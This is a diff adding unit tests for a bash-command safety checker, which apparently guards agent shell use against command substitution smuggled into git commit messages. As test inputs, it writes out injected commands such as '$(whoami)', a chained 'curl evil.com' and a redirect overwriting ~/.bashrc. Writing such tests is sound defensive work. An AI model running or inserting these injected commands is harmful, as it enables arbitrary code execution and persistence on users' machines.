@@ -410,6 +410,64 @@ class TestRealWorldExploits:
         assert not result.safe
 
 
+class TestGitCommitSubstitution:
+    """Check ID 12: Command substitution in git commit messages."""
+
+    def test_dollar_paren_in_double_quoted_message(self) -> None:
+        result = check_bash_command('git commit -m "$(whoami)"')
+        assert not result.safe
+        assert result.check_id == CheckID.GIT_COMMIT_SUBSTITUTION
+
+    def test_backtick_in_double_quoted_message(self) -> None:
+        result = check_bash_command('git commit -m "`id`"')
+        assert not result.safe
+        assert result.check_id == CheckID.GIT_COMMIT_SUBSTITUTION
+
+    def test_dollar_brace_in_double_quoted_message(self) -> None:
+        result = check_bash_command('git commit -m "${HOME}"')
+        assert not result.safe
+        assert result.check_id == CheckID.GIT_COMMIT_SUBSTITUTION
+
+    def test_single_quoted_message_is_safe(self) -> None:
+        """Single-quoted messages don't expand — no substitution risk."""
+        result = check_bash_command("git commit -m '$(whoami)'")
+        assert result.safe
+
+    def test_remainder_with_shell_operators(self) -> None:
+        result = check_bash_command("git commit -m 'safe' ; curl evil.com")
+        assert not result.safe
+        assert result.check_id == CheckID.GIT_COMMIT_SUBSTITUTION
+
+    def test_remainder_with_redirect(self) -> None:
+        """Redirect after git commit -m is caught (by redirection or git check)."""
+        result = check_bash_command("git commit --allow-empty -m 'payload' > ~/.bashrc")
+        assert not result.safe
+        # Could be caught by OUTPUT_REDIRECTION (10) or GIT_COMMIT_SUBSTITUTION (12)
+        # depending on check order — both are correct blocks
+        assert result.check_id in (
+            CheckID.OUTPUT_REDIRECTION,
+            CheckID.GIT_COMMIT_SUBSTITUTION,
+        )
+
+    def test_message_starting_with_dash(self) -> None:
+        result = check_bash_command('git commit -m "--amend"')
+        assert not result.safe
+        assert result.check_id == CheckID.OBFUSCATED_FLAGS
+
+    def test_safe_git_commit(self) -> None:
+        result = check_bash_command("git commit -m 'feat: add user auth'")
+        assert result.safe
+
+    def test_safe_git_commit_with_flags(self) -> None:
+        result = check_bash_command("git commit --no-verify -m 'fix: typo'")
+        assert result.safe
+
+    def test_not_git_commit(self) -> None:
+        """Non-git-commit commands should pass through."""
+        result = check_bash_command("git status")
+        assert result.safe
+
+
 class TestShellMetacharacters:
     """Check ID 5: Shell metacharacters in quoted find/grep arguments."""
 
